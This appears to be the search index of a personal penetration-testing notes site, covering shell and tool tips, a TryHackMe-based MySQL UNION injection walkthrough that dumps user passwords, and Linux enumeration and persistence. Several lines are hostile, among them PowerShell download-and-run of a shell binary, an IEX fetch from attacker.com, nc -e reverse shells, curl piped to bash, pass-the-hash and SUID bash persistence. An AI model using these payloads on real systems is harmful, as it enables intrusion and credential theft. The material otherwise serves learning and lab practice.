http://&lt;LHOST&gt;:8000/shell.exe -OutFile ./shell.exe &amp;&amp; .\\shell.exe\"\n</code></pre> <p>spawn a process</p> <pre><code>Start-Process PROCESS_NAME 'Start-Process cmd -Verb RunAs' -Credential USERNAME\n</code></pre> <p>netcat </p> <pre><code>nc.exe -e powershell        ; works just like other shells\n</code></pre> <p>invoke expression</p> <pre><code>IEX(New-Object WebClient).downloadString(\"http://attacker.com/rev.ps1\")\n</code></pre>"},{"location":"freedom_of_movement/powershell_cheatsheet/#cmd-cheats","title":"CMD cheats","text":"<ul> <li>type      == cat</li> <li>findstr   == grep</li> <li>dir /a    == ls -a</li> <li>ren                                       ; alias for rename</li> <li>rename                                    ; path needed for source, NOT needed for destination</li> <li>copy                                      ; source destination</li> <li>del</li> <li>dir</li> <li>net stop/start SERVICE_NAME               ; other functions too, see /?</li> <li>whoami /all                               ; gives some security info, suchas permissions</li> </ul>"},{"location":"freedom_of_movement/serving_files/","title":"methods of serving to victims","text":"<ul> <li>MAKE a www directory!!!</li> <li>MAKE a www directory!!!</li> <li>MAKE a www directory!!!</li> </ul> <p>python web server</p> <pre><code>python3 -m http.server PORT_NUM\n</code></pre> <p>PHP</p> <pre><code>php -S 0.0.0.0:PORT_NUM\n</code></pre> <p>if given command execution    </p> <pre><code>we can pipe the output of curl/wget to the shell of our choice avoiding touching disk\nbash &lt;(curl attcker.com)\n</code></pre> <p>nc/named pipes in unix environment</p> <pre><code>useful for basic files\n2 stages\n    stage1: setup the target\n        nc -lvnp PORT_NUM &gt; OUT_FILE\n    stage2: send the file\n        cat SOME_TEXT_FILE | /dev/tcp/TARGET_IP/TARGET_PORT\n</code></pre> <p>preserving \"last modified\" field</p> <pre><code>step1: copy link/download link\nstep2: wget the copied link\n\n</code></pre>"},{"location":"freedom_of_movement/tmux/","title":"tmux","text":""},{"location":"freedom_of_movement/tmux/#basic-conf-file","title":"basic conf file","text":"<p>for less psychotic keybinds; place in  <code>~/.tmux.conf</code>; new prefix is <code>CTRL a</code></p> <pre><code>unbind C-b\nset-option -g prefix C-a\nbind-key C-a send-prefix\nset-option -g default-shell /bin/zsh\nset -g history-limit 9001\n</code></pre>"},{"location":"freedom_of_movement/tmux/#tmux-essentials","title":"tmux essentials","text":"<p>If you are ever lost in your tmux session, you can list all windows in pane in a GUI, which provides a preview of what is on each window and pane.</p> <pre><code>PREFIX w\n</code></pre> <p>searching tmux history; works in broken/scuffed shells</p> <pre><code>PREFIX [                    ; enters 'copy mode', allows for searching text\nCTRL+S                      ; search down, from begining of history to present\n# alternatively...\nCTRL+R                      ; search 'reverse' from present backwards, preffered\nCTRL+SPACE                  ; start highlighting text in copy mode\nCTRL+W                      ; copy highlighted text\nprefix ]                    ; paste the copied text\n</code></pre> <p>create window; rename window; go to last window; go to window number <code>X</code>, where <code>X</code> is an integer</p> <pre><code>PREFIX c\nPREFIX ,\nPREFIX l       ; note this is a lowercase L\nPREFIX X\n</code></pre> <p>kill current pane; may be <code>TTY</code> specific, see <code>stty -a</code> to see how signals are bound</p> <pre><code>CTRL+D                      ; just like a python REPL- read evaluate print loop\n</code></pre>"},{"location":"freedom_of_movement/tmux/#tmux-meta-session-commands","title":"tmux meta-session commands","text":""},{"location":"freedom_of_movement/tmux/#tmux-prompt","title":"tmux prompt","text":"<p>Almost all of the cmdline actions we can do such as <code>tmux ls</code> work inside the tmux prompt.</p> <p>enter via </p> <pre><code>PREFIX SHIFT :\n</code></pre> <p>modify tmux session home; first enter the tmux prompt</p> <pre><code>attach -c /path/to/new/home \n</code></pre> <p>rename a window</p> <pre><code>rename-window NEW_NAME\n</code></pre>"},{"location":"freedom_of_movement/tmux/#tmux-administrative-commands","title":"tmux administrative commands","text":"<p>rename session</p> <pre><code>PREFIX $\n</code></pre>"},{"location":"freedom_of_movement/tmux/#tmux-scripting","title":"tmux scripting","text":"<p>Powerful for repeated tasks such as setting up a workspace for attacking an single target.  Possible to create initial workspace directory structure, set environment variables specific to a tmux session and stage initial recon commands. </p> <p>example; note <code>C-m</code> is the way tmux scripting sends <code>Enter</code> to a session</p> <pre><code>tmux send-keys 'sudo nmap -v -sC -sV 8.8.8.8 -oA first_scan' C-m\n</code></pre> <p>run a script on a tmux pane via</p> <pre><code># begin by selecting the pane of interest\n# next, enter the tmux prompt\nPREFIX :\n# finally, we run the script we have prepared\nrun-shell ~/PATH/TO/SCRIPT\n</code></pre>"},{"location":"freedom_of_movement/tmux/#references","title":"references","text":"<ol> <li>run-shell discovery</li> <li>tmux reference via short youtube vids</li> </ol>"},{"location":"freedom_of_movement/tshark/","title":"tshark","text":"<p>While Wireshark is great for initial diagnosis and exploring, the goal should be to close the tool as quickly as possible. Moving to a programmable solution is a priority. The solution is tshark, use it to extract fields that you identify during initial triage. </p>"},{"location":"freedom_of_movement/tshark/#extract-dns-query-names","title":"Extract DNS Query Names","text":"<pre><code>tshark -r example.pcap -T fields -e dns.qry.name\n</code></pre>"},{"location":"freedom_of_movement/tshark/#extract-multiple-fields-including-frame-number","title":"Extract Multiple Fields - Including Frame Number","text":"<pre><code>tshark -r example.pcap -T fields -e frame.number -e dns.qry.name \n</code></pre>"},{"location":"freedom_of_movement/tshark/#other-resources","title":"Other Resources","text":"<ul> <li>a more complete cheatsheet</li> </ul>"},{"location":"freedom_of_movement/vi_or_vim/","title":"vi_or_vim","text":""},{"location":"freedom_of_movement/vi_or_vim/#essentials","title":"essentials","text":"<p>open the vi prompt; this is for entering meta commands</p> <pre><code>:\n# note the prompt has history\n# navigate with arrowkeys after entering\n</code></pre> <p>how to escape; close the tool</p> <pre><code>:\nq\n# note that ! or w might be required\n# ! is for force\n# w is for write\n</code></pre> <p>moving the cursor; <code>arrow keys</code> or <code>h</code>, <code>j</code>, <code>k</code>, <code>l</code></p> <pre><code># self explanatory\narrow keys\n# these feel a bit constricted to me\nh # left\nj # down\nk # up\nl # right\n</code></pre> <p>enter <code>insert</code> mode</p> <pre><code># move cursor into position\ni\n</code></pre> <p>enter <code>insert</code> mode, place cursor at end of line</p> <pre><code>shift + a\n</code></pre> <p>enter <code>insert</code> mode, place cursor at start of line</p> <pre><code>shift + i\n</code></pre> <p>exit any <code>mode</code>, such as <code>copy</code>, <code>insert</code>, <code>visual</code> , etc</p> <pre><code># spam the ESC key\n# at least one press is necessary\n</code></pre> <p>searching simlar to <code>less</code>, similar rules apply</p> <pre><code># start searching, then input your pattern\n# search is performed top of document downwards\n/ \n# we observe some highlighting, usually YELLOW\n# the editor will jump to first result\n# \n# Jump to next result\nn\n</code></pre>"},{"location":"freedom_of_movement/vi_or_vim/#advanced-concepts","title":"advanced concepts","text":"<p>deletions; lines, words</p> <pre><code># move cursor onto begining of the object\n#\ndw # delete word\ndd # delete line\n# periodic writes and backups are advised\n# latency and learning can cause errors\n</code></pre> <p>jump to insert mode, in the line below cursor location</p> <pre><code>o\n</code></pre> <p>copy; YANK, yank an entire line</p> <pre><code>yy\n</code></pre> <p>paste; paste the entire line, below the line the cursor is on</p> <pre><code>p\n</code></pre> <p>search and replace with <code>sed</code> inside <code>vi</code>/<code>vim</code></p> <pre><code># enter the vi prompt\n:\n# in the vi prompt we use this to start a sed command\n%s\n# enter our sed command\n# e.g. of what is commonly required\n%s/SEARCH_TERM/REPLACE_TERM/gi\n# the trailing /gi is for \n# g - global\n# i - insensitve\n# excellent because it nearly identical to common regex implementations\n#\n# this can be extended to regex for anything\n# including special chars; e.g. replacing \\n with CATS\n%s/\\n/CATS/g\n#\n# search current line only, replace first occurence\n# once again in the : prompt\n.s/SEARCH/REPLACE/\n# . - indicates current line\n# add the g suffix to search/replace whole line\n# add the i suffix to search ignoring case\n</code></pre>"},{"location":"freedom_of_movement/vi_or_vim/#visual-block-mode","title":"Visual Block Mode","text":"<p>Enter Visual Block Mode</p> <pre><code>ctrl + v\n</code></pre> <p>Indent Block</p> <pre><code>ctrl + v\n# highlight desired lines\n&gt;&gt; # right indent\n&lt;&lt; # left indent\n</code></pre> <p>Highlight Up to</p> <pre><code>ctrl + v\n# place curosor at desired start\nt + CHAR\n# where CHAR is the char you want to highlight up to\n</code></pre> <p>Actions</p> <pre><code># editing actions such as dd will act on highlighted section\n</code></pre> <p>Multi-Line or Multi-Cursor behavior</p> <pre><code>ctrl + v \n# select Vertical positions\nshift + i # enters insert module of visual block mode\n# input your desired change\n# change is not yet echoed on all lines\nesc\n# now action is repeated on all highlighted lines\n</code></pre>"},{"location":"freedom_of_movement/services/dns/","title":"DNS","text":""},{"location":"freedom_of_movement/services/dns/#get-txt-records","title":"Get TXT records","text":"<pre><code>dig subdomain.domain.topleveldomain txt\n</code></pre> <pre><code>nslookup -type=txt subdomain.domain.topleveldomain\n</code></pre>"},{"location":"freedom_of_movement/services/dns/#tools-for-exfilinfil","title":"Tools for Exfil/Infil","text":"<ul> <li>[packety.py] (https://github.com/kleosdc/dns-exfil-infil/blob/main/packety.py)</li> <li>[packetGrabber.py] (https://github.com/kleosdc/dns-exfil-infil/blob/main/packetyGrabber.py)</li> </ul> <p>The packetGrabber.py is useful for reassembling an exfiltration. Given a domain and a pcap file, packetGrabber.py reassembles the output of a DNS exfiltration. Expects base58 encoded as base64, might not support other encodings. </p>"},{"location":"freedom_of_movement/services/ftp/","title":"ftp specific movements","text":"<p>recursively download an ftp server</p> <pre><code>wget -m --no-passive ftp://USER_NAME:PASSWORD@$ip\n</code></pre> <p>alternatively if you are in console, it is similar to SMB</p> <pre><code>prompt OFF\nrecurse ON\nmget *\n</code></pre>"},{"location":"freedom_of_movement/services/index-of-services/","title":"Index of services","text":"<ul> <li>ftp</li> <li>smb</li> <li>index-of-databases</li> </ul>"},{"location":"freedom_of_movement/services/smb/","title":"smb specific movements","text":"<p>PSEXEC.py and SMB are related; think one see the other</p>"},{"location":"freedom_of_movement/services/smb/#download-an-entire-share-recursively","title":"download an entire share recursively","text":""},{"location":"freedom_of_movement/services/smb/#paste","title":"paste","text":"<p>be on share root &amp; make a local dir to catch the garbage</p> <pre><code>recurse ON\nprompt OFF\nmget *\n</code></pre>"},{"location":"freedom_of_movement/services/smb/#explanation","title":"explanation","text":"<pre><code>smbclient //$ip//SHARE_NAME -U USER_NAME -P PASSWORD\nsmb&gt; Recurse ON\nsmb&gt; Prompt OFF\nsmb&gt; mget *         ; on share root\n</code></pre>"},{"location":"freedom_of_movement/services/smb/#display-windows-extended-attributes","title":"display windows extended attributes","text":"<p>filestreams, hidden, etc</p> <pre><code>smb&gt; allinfo FILE_NAME\nsmb&gt; dir /ah             ; dir attribute hidden\n</code></pre>"},{"location":"freedom_of_movement/services/smb/#connect-to-share-using-hash","title":"connect to share using hash","text":"<pre><code>smbclient //10.10.10.10/sharename -U username --pw-nt-hash C5B11AF4466043323EA4E7838C886C73\n</code></pre>"},{"location":"freedom_of_movement/services/databases/MySql/","title":"MySQL","text":""},{"location":"freedom_of_movement/services/databases/MySql/#collection-of-facts","title":"collection of facts","text":""},{"location":"freedom_of_movement/services/databases/MySql/#default-credentials","title":"default credentials","text":"<pre><code>root : NOPASSWORD       ; if within rules of engagement try bruteforcing this\nPORT : 3306\n</code></pre>"},{"location":"freedom_of_movement/services/databases/MySql/#injection-sqli","title":"injection - SQLi","text":""},{"location":"freedom_of_movement/services/databases/MySql/#general-concepts","title":"general concepts","text":"<p>User input is improperly handled, resulting in the SQL service interpreting unintended code. This can result in the SQL service interpreting arbitrary statements crafted by an attacker. </p> <p>Possible outcomes are</p> <ul> <li>complete disclosure of database contents</li> <li>some injection allows for revision of existing entires; update statements</li> <li>additions of new entires is also possible</li> <li>authentication bypass</li> <li>escalation of privilege (authenticate as high priv user)</li> </ul>"},{"location":"freedom_of_movement/services/databases/MySql/#techniques","title":"techniques","text":""},{"location":"freedom_of_movement/services/databases/MySql/#dealing-with-single-line-output","title":"dealing with single line output","text":"<p>When using <code>group_concat()</code> to dump multiple lines at once, the funciton goes directly after <code>SELECT</code>. E.g.</p> <pre><code>SELECT group_concat( table1,table2,table3, ... ) FROM TABLE_NAME\n</code></pre>"},{"location":"freedom_of_movement/services/databases/MySql/#procedures","title":"procedures","text":"<p>development of these procedure sheets and surround information are intended to facilitate my mastery of the topics. </p>"},{"location":"freedom_of_movement/services/databases/MySql/#enumerate-sql-database-via-union-injection","title":"enumerate SQL database via UNION injection","text":"<p>The following methodology was developed while participating in TryHackMe's Advent of Cyber 2022. The challenge room for Day 16 provided a friendly target to practice enumerating a <code>MySQL</code> database, ultimatly resulting in the weaponization of a SQL injection vulnerabliity. </p>"},{"location":"freedom_of_movement/services/databases/MySql/#reverse-engineer-the-hard-coded-sql-statement","title":"reverse engineer the hard coded SQL statement","text":"<p>We need to determine the number of columns in the SQL statement. To do this, we use a valid query that returns data. We then perform a <code>UNION</code> with increasingly more integers or <code>NULL</code>s. A mismatch in number of columns in the statement and number of <code>NULL</code>s provided yields no data or an error. A match in the two counts results in the expected return of the initial valid statement.</p> <pre><code>/webapp/elf.php?id=1%20union%20all%20select%201,2,3,4,5,6,7\n</code></pre> <p>union all is identical to union, however it includes all duplicates.</p> <p>We can now  invalidate our original query, but allow the <code>1,2,3,...</code> to persist. This displays which columns of the backend statement are being returned as outputs. For this particular lab, <code>3,4</code> are returned.   </p> <pre><code>/webapp/elf.php?id=-1%20union%20all%20select%201,2,3,4,5,6,7\n</code></pre> <p>We can now enumerate the databases conected to the service by enumerating the meta-tables.</p>"},{"location":"freedom_of_movement/services/databases/MySql/#enumerate-databases-and-associated-tables-connected-to-the-service","title":"enumerate databases and associated tables connected to the service","text":"<p>We can enumerate the databases attached to the service by performing queries on the <code>information_schema</code> meta-table. This table is guaranteed to be available in the <code>MySQL</code> database, it is necessary for functionality. </p> <p>The following statement was created by consulting the official <code>MySQL</code> documentation on the <code>information_schema</code> table.</p> <pre><code>/webapp/elf.php?id=-1%20union%20all%20select%201,2,table_schema,table_name,5,6,7%20from%20information_schema.tables%20where%20table_schema%20not%20like%20%27%schema%%27\n</code></pre> <ul> <li><code>information_schema.tables</code> contains rows of information on all tables attached to the service</li> <li><code>table_schema</code> is the name of a database that is attached to the service</li> <li><code>table_name</code> is the name of a given table</li> <li>a row with columns <code>table_schema</code> and <code>table_name</code> describes the mapping between tables and databases</li> <li>our final clause <code>WHERE table_schema NOT LIKE '%schema%'</code> is a luxury for the attacker. We are using it to supress all the meta-tables associated with the service.</li> </ul>"},{"location":"freedom_of_movement/services/databases/MySql/#enumerate-columns-present-in-a-discovered-table","title":"enumerate columns present in a discovered table","text":"<p>Armed with information on which tables are associated with which databases, we can create targeted queries to harvest high value information. If sensitive information is inside the database we can yank all of it. For defenders, a <code>UNION</code> SQuLi injection attack is nearly the worst case scenario. The only thing worse would be an <code>UPDATE</code> vulnerability, potentially resulting in a mass destruction event. </p> <p>Not shown here, from enumerating databasesand tables, we now have knowledge of a table called <code>users</code> from the <code>logistics</code> database. Once again we use the meta-tables to get information about what columns exist in the <code>users</code> table. We query the <code>information_schema.columns</code> table in the following way</p> <pre><code>/webapp/elf.php?id=-1%20union%20all%20select%201,2,column_name,table_name,5,6,7%20from%20information_schema.columns%20where%20table_schema%20like%20%27%logistics%%27%20and%20table_name%20like%20%27%users%%27\n</code></pre> <ul> <li><code>information_schema.columns</code> contains all column information of databases associated to the service</li> <li><code>column_name</code> is the name of a column</li> <li><code>table_name</code> is the name of the table\\</li> <li>a row with columns <code>column_name</code> and <code>table_name</code> describes the mapping between columns and tables. We now know which columns belong to the <code>users</code> table, our high value target</li> <li>our final clause <code>WHERE table_schema LIKE 'logistics' AND table_name LIKE 'users'</code> specifies that we are only interested in the rows associated with the <code>users</code> table from the <code>logistics</code> database. </li> <li>the <code>AND table_name LIKE 'users'</code> section can be removed to see all table-column mappings of the <code>logistics</code> database</li> </ul>"},{"location":"freedom_of_movement/services/databases/MySql/#target-aquired-finalize-weaponization-of-the-exploit","title":"target aquired,  finalize weaponization of the exploit","text":"<p>The previous enumerations revealed that</p> <ul> <li>the <code>logistics</code> database is attached to the service</li> <li>the <code>logistics</code> database has a table called <code>users</code></li> <li>the <code>users</code> table has columns <code>username,password</code> amoung some other valuable fields</li> <li>arbitrary <code>UNION</code> statements are possible, resulting in extraction of any and all data from the <code>logistics</code> database</li> </ul> <p>The final query:</p> <pre><code>/webapp/elf.php?id=-1%20union%20all%20select%201,2,username,password,5,6,7%20from%20users\n</code></pre> <ul> <li>dumps username password mappings stored in the <code>logisitcs</code> database</li> <li><code>logistics</code> database is not explicitly listed. Only one database was attached to this service, so it defaults to <code>logistics</code></li> </ul> <p>the SQLi vulnerability has been weaponized and delivered over the network. You can now move on to exploitation of the compromised target</p>"},{"location":"freedom_of_movement/services/databases/MySql/#references-for-development-of-this-procedure","title":"references for development of this procedure","text":"<p>the following links are replicated in the \"external sources\" section at the bottom of this page</p> <ul> <li>MySQL | information_schema reference</li> <li>MySQL | information_schema.tables table </li> <li>MySQL | information_schema.columns table</li> <li>MySQL | NOT operator</li> <li>MySQL | LIKE operator</li> <li>Understanding How Prepared Statements Prevent SQLi</li> </ul>"},{"location":"freedom_of_movement/services/databases/MySql/#external-sources","title":"external sources","text":"<ul> <li>pentestmonkey SQLi cheatsheet</li> <li>MySQL | information_schema reference</li> <li>MySQL | information_schema.tables table </li> <li>MySQL | information_schema.columns table</li> <li>MySQL | NOT operator</li> <li>MySQL | LIKE operator</li> <li>Understanding How Prepared Statements Prevent SQLi</li> </ul>"},{"location":"freedom_of_movement/services/databases/NoSQL_MongoDB/","title":"NoSQL_MongoDB","text":"<p>\"not-only-SQL\" allows for data to be stored in creative ways. </p>"},{"location":"freedom_of_movement/services/databases/NoSQL_MongoDB/#basic-cli-movements","title":"basic CLI movements","text":"<p>list databases connected to service</p> <pre><code>show dbs\n</code></pre> <p>use a database </p> <pre><code>use NAME_OF_DB\n</code></pre> <p>list what is in the database</p> <pre><code>show collections\n</code></pre> <p>dump data from collection via <code>find()</code> method</p> <pre><code>db.COLLECTION_NAME.find()\n</code></pre>"},{"location":"freedom_of_movement/services/databases/NoSQL_MongoDB/#techniques","title":"techniques","text":""},{"location":"freedom_of_movement/services/databases/NoSQL_MongoDB/#auth-bypass-via-tautology","title":"auth bypass via tautology","text":"<p>Always true statements can be used to bypass authentication. In this case, boolean OR.</p> <pre><code>' || '1=1\n</code></pre>"},{"location":"freedom_of_movement/services/databases/index-of-databases/","title":"Index of databases","text":"<ul> <li>MySql</li> <li>NoSQL_MongoDB</li> </ul>"},{"location":"freedom_of_movement/software/burpsuite/","title":"burpsuite","text":"<ul> <li>hotkeys</li> <li>features</li> <li>tricks</li> </ul>"},{"location":"freedom_of_movement/software/burpsuite/#intercept-everything","title":"intercept everything","text":""},{"location":"freedom_of_movement/software/burpsuite/#cmdline-http-traffic","title":"cmdline http traffic","text":"<p>In bash the env var <code>http_proxy</code> will cause any http traffic of your child processes to pass through the proxy you specify.</p> <pre><code>export http_proxy 127.0.0.1:8080\n# or wherever you have burp setup to listen\n</code></pre> <p>This is particularly useful for troubleshooting exploits and scripts. </p>"},{"location":"freedom_of_movement/software/burpsuite/#repeater","title":"repeater","text":"<ul> <li>post requests have less bad characters</li> </ul> <p>URL ENCODE/DECODE HOTKEY</p> <pre><code>CTRL+U\nCTRL+SHIFT+U\n</code></pre> <p>to send a request in repeater</p> <pre><code>CTRL+SPACE\n</code></pre>"},{"location":"freedom_of_movement/software/burpsuite/#intruder","title":"intruder","text":"<p>many attack types; notably clusterbomb/pitchfork</p> <pre><code>i mention pitchfork b.c it allows us to use multiple wordlists\n\nalso allows for the option to REGEXP inside response to get some updated value\n    an alternate solution to what MACROS can provide\n</code></pre>"},{"location":"freedom_of_movement/software/burpsuite/#macros","title":"macros","text":"<p>A larger topic, useful for repeating sequences of commands.</p> <p>example use case</p> <pre><code>site has CSRF protections and uses session tokens\n\neach login attempt requires that we get a new\n    session cookie\n    CSRF protection token\n\notherwise our login attempt will not even get processes\n\nmacros solve this issue\nmacro will\n    issue get request between each attempt\n    get token and get cookie\n    update token/cookie in next brute attempt\n\n</code></pre>"},{"location":"freedom_of_movement/software/index-of-software/","title":"Index of software","text":"<ul> <li>burpsuite</li> <li>wireshark</li> <li>web-browser</li> </ul>"},{"location":"freedom_of_movement/software/web-browser/","title":"Hotkeys &amp; keystokes","text":""},{"location":"freedom_of_movement/software/web-browser/#keyboard-movements","title":"keyboard movements","text":"<p>jump to URL bar</p> <pre><code>ctrl+l\n</code></pre> <p>jump to search bar, such as on a google page</p> <pre><code>/\n</code></pre> <p>sometimes a page requires you press another key too, it is page specific. e.g. azure dashboard uses <code>G+/</code></p> <p>close current tab</p> <pre><code>ctrl+w\n</code></pre> <p>open most recently closed tab</p> <pre><code>ctrl+shift+t\n</code></pre> <p>open new tab</p> <pre><code>ctrl+t\n</code></pre> <p>do a search with default search engine, usually google, <code>ctrl+k</code> is more reliable</p> <pre><code>ctrl+k\nctrl+e\n</code></pre> <p>cycle right in tabs</p> <pre><code>ctrl+tab\n</code></pre> <p>cycle left in tabs</p> <pre><code>ctlr+shift+tab\n</code></pre> <p>page forward/back</p> <pre><code>alt+arrowkeys\n</code></pre>"},{"location":"freedom_of_movement/software/web-browser/#mouse-movements","title":"mouse movements","text":"<p>select non-contiguous collection of tabs</p> <pre><code>ctrl+click\n</code></pre> <p>select conituguous colleciton of tabs</p> <pre><code>HOLD ctrl+shift\nclick first tab\nclick last tab\n</code></pre> <p>The above to mouse movents can be combined with <code>ctrl+w</code> to close collections of tabs enmasse.</p>"},{"location":"freedom_of_movement/software/web-browser/#unexpected-features-and-fun-facts","title":"unexpected features and fun facts","text":"<ol> <li>URL bar indexes favorited items and history by default, useful for navigating the psycotic bookmark folder structre you no doubt have. </li> </ol>"},{"location":"freedom_of_movement/software/wireshark/","title":"wireshark","text":"<p>reason</p> <pre><code>it can be useful to sniff my own traffic to see if there is creds in api requests of an application\nexcellent for analyzing my own traffic and more is needed than than tcpdump -i INTERFACE icmp\nuseful for reversing applications; dynamic analysis\n</code></pre> <p>cycle through TCP streams consecutively; useful for small captures</p> <pre><code>1. follow tcp stream\n2. bottom right; there should be some kind of incremental button    \n</code></pre> <p>strings? nah regex in Wireshark interface! ; incredibly useful</p> <pre><code>there is a find utility on the main horizontal bar; it is a magnifying glass icon\ncan find for strings in\n    packets\n    frames\n    field names\n    field values\n</code></pre>"},{"location":"hash_cracking/hashcat/","title":"basic guide to hashcat","text":"<p>starting flags ; note that hashcat is positional!!!</p> <pre><code>--example-hashes\n</code></pre> <p>user the  --username flag when presenting hashcat with the following format</p> <pre><code># --username\nadmin:HASH_VALUE$AJDSLGJALSDGNL$SDfkaslkdfhaskjfdl\n# hashcat hashfile.txt --show then yields a nice output!\n</code></pre>"},{"location":"hash_cracking/index-of-hash_cracking/","title":"Index of hash cracking","text":"<ul> <li>hashcat</li> </ul>"},{"location":"linux/index-of-linux/","title":"Index of linux","text":"<ul> <li>lin_enumeration</li> <li>persistence</li> </ul>"},{"location":"linux/lin_enumeration/","title":"linux_enumeration","text":"<p>Answer the following every time:</p> <ul> <li>who is this user?  -&gt; enumerate the <code>/opt</code> directory !! search for files owned by the user</li> <li>what do they do/ what is their role?</li> <li>what do they NEED to do what they do ?</li> </ul> <pre><code>ls -Alh *                                   ; sneaky directory enumeration\n.ssh                                        ; upgrade access from webshell\n</code></pre> <p>manual enumeration for priv esc</p> <pre><code>setup /dev/shm\nfind &gt; something.txt\ngetcap -r /  &gt; something.txt\n</code></pre> <p>interesting locations upond landfall</p> <pre><code>w                                           ; who logged, what doing\nid                                          ; group membership ?\n.profile/.bash_history type files           ; or user specific .conf\necho $ENV\n/var/                                       ; this is where users make their mistakes are such as /var/backups\n/opt\n/usr/local                                  ; out of date software goes here (not touched by pckg manager)\n/etc/hosts\n/etc/passwd\n/etc/crontab\nss -lntp                                    ; tcp listeners on victim (enumerating services)\nps -ef                                      ; enumerate processes visble to me\n</code></pre>"},{"location":"linux/lin_enumeration/#who-uses-this-machine","title":"who uses this machine?","text":"<p>collect human profiles on the users as well; we want to know EVERYTHING</p> <pre><code>w        # who is logged on, what they are doing (better who)\nlast     # show list of last logged on users, invesitgate precedence\n</code></pre>"},{"location":"linux/lin_enumeration/#permissions","title":"permissions","text":"<pre><code>id   - take note of groups\n\nfind -type -f -perm -4000 -o -perm -2000    ; get those SUID/GUID files\n    information on directory containing user owned SUID/GUID file \n    if we can write here we can write symlink ontop of w.e has suid; e.g ln -sf BAD_SCRIPT.sh SUID_SCRIPT.sh            ; this is an escalation, move to new file\n\ncrontab -l/ crontab -e / read /etc/crontab\n\ngetcap -r / 2&gt;/dev/null                     ; can process set its UID set_uid cap, especially code on machines\n\netc/doas.conf \n\nsudo -l                                     ; (NOISY)\n</code></pre>"},{"location":"linux/lin_enumeration/#notable-group-membership","title":"notable group membership","text":"<p>adm group</p> <pre><code>Go and read all the system logs in /var/log and other locations\n</code></pre> <p>ldx lxc containerd docker groups</p> <pre><code>attempt the alpine container priv esc\nin general look for virtualization related vulns\n</code></pre> <p>custom groupname ?</p> <pre><code>find -group CUSTOM_GROUPNAME 2&gt;/dev/null\n</code></pre>"},{"location":"linux/lin_enumeration/#geography-basis-of-reality","title":"geography &amp; basis of reality","text":"<p>what version/release is the OS?</p> <pre><code>cat /etc/*rel*\n</code></pre> <p>find compiler tools; shows compilers in dpkg list, can be extended to any package manager</p> <pre><code>dpkg --list | grep -i compiler\n</code></pre> <p>host identity</p> <pre><code>hostname           ; give hostname\ncat /etc/*rel*     ; give OS release info\n</code></pre> <p>Which package managers are present?</p> <pre><code>snap\ndpkg -l           ; # list packages\nrpm  -qa          ; # query all\n</code></pre> <p>PATH/ENV enumeration                      ; a bit more involved</p> <pre><code>'w' command                                 \n; gives information on signed in users and what they are doing\n\necho $PATH                              ; modify path to location of BADBINARY\necho $ENV                               ; this one may be wrong ?\n\n--- no idea what the following is talking about ---\nrequires an elevated execution\nrequires a call to some other system binary ; strace command potentially useful\nrequires the binary call to be not full path qualified\nThe specifics vary a lot here; sometimes we replace a system binary; othertime a shared object\n</code></pre> <p>SERVICES enumeration</p> <pre><code>find .service files                         \n; .service file is similar to .conf  rules/scripts to execute at startup, perms?\n    common .service entry is ExecStart      \n    ; binary which occupies this value is exec at start, can hold a bash -c 'CMD'\n    /usr/lib/systemd/system/\n    /run/systemd/system/\n    Do not directly edit the SERVICE file in the directory. \n    Instead, copy, edit, then override the original \n\nps aux                                      ; big info on  process/services\npe -ef --forest                             ; similar to aux but diff format; --forest flag works for aux\n\nss -lntpa                                   \n; show listening tcp ports, include processes\n\nls /proc                                    ; lists running processes in the \npseudo file system /proc\n\nsystemctl status SERVICE                    \n; pay attention to 'Loaded' category, similar to DLL, MakeFile, or .conf, we can perhaps hijack\nEnumerate the loaded library!               \n; enumerating these loaded libraries is essential, library perms?\n\nnetstat -ltp or netstat lntp ; BOOMER ss\n\n\n</code></pre> <p>victim machine ports; local host</p> <pre><code>ss -tulpn\nnetstat -tulpn\nssh -L PORT:localhost:PORT -i id_rsa user@$ip       ; will forward traffic to my localhost, bypassing firewall, needs initial accesss\nnote id_rsa should be created on a per box basis    ; protect my local username\n</code></pre>"},{"location":"linux/lin_enumeration/#information-disclosure","title":"information disclosure","text":"<pre><code>.*history                                   ; unintended info disclosure\n.config                                     ; unintended info disclosure\nNetwork files and shares                    ; potential escallation/information\nenumerate all /etc/*.conf files\ne.g. /etc/resolv.conf &lt;- get DNS info\n\nCan i read /var/mail/* ??? \n\npay attention to MOTD on login\n</code></pre>"},{"location":"linux/lin_enumeration/#pattern-recognition-environment-analysis","title":"pattern recognition; environment analysis","text":"<p>watching for changes and timestamps can be tedious when you mangle the syntax repeatedly</p> <pre><code>watch -n 1 ls -la /dev/shm\n# will give an update of changes on the /dev/shm dir every minute\n# REALLY powerful for monitoring for file creations; or just movement of crontjobs etc etc\n# powerful for demonstrating proofs of your command executions\n# powerful for demonstrating\n# demonstrating\n</code></pre> <p>novell methods of enumeration</p> <pre><code>lsof           ; list open files\n</code></pre>"},{"location":"linux/lin_enumeration/#enumerating-internal-services","title":"enumerating internal services","text":"<p>common tools; likely to exist on target</p> <pre><code>ss -lntp \nnetstat ano\nps -ef --forest\n</code></pre> <p>forcing a tcp handshake and get data</p> <pre><code>nc -z           # zero-I/O mode [used for scanning]\ncurl\nwget\n</code></pre>"},{"location":"linux/lin_enumeration/#help-i-am-in-a-container","title":"help, I am in a container","text":"<p>investigate root for strange files or dirs such as</p> <pre><code>dockerenv\nvbox\nvmware\n</code></pre> <p>enumerate <code>/dev</code> for inappropriate mounts</p> <pre><code>often during dev, things are mounted for simplicity\nthings can be overlooked/forgotten\nexploit their oversight\n</code></pre> <p>/proc still exists, consider reading the following</p> <pre><code>/proc/net/tcp       # budget netstat\n/proc/self          # traditional LFI file\n/proc/sched_debug   # running process//services\n/proc/PID/maps      # replace process id, access virt address for binary exploit\n</code></pre> <ul> <li>these are also powerful when local file inclusion vulnerability is discovered.</li> <li>unfamiliar output should be googled, it is not being parsed by <code>netstat</code> so you must parse it yourself. see alternate expressions of ip address </li> </ul>"},{"location":"linux/persistence/","title":"persistence","text":""},{"location":"linux/persistence/#basic-noisy","title":"basic &amp; noisy","text":"<p>suid copy of <code>/bin/bash</code></p> <ul> <li>in {target we will escalate to}'s home directory (or anywhere perhaps the /dev or /tmp )</li> <li>has suid set</li> <li>other group has x permision</li> <li>when executing, use -p flag to keep permissions</li> </ul> <p>create .ssh/authorized_keys &amp; add my pub_key enables <code>ssh@$IP -i id_rsa</code> </p> <ul> <li>create a new key with <code>ssh-keygen -f NAME -c 'invae'</code>; chmod as necessary; copy to victim</li> <li>keys behave best with permission 600</li> <li>perm 700 for .ssh (owner of home dir owns .ssh not root)</li> <li>perm 644 for authorized_keys, 1 key per line</li> 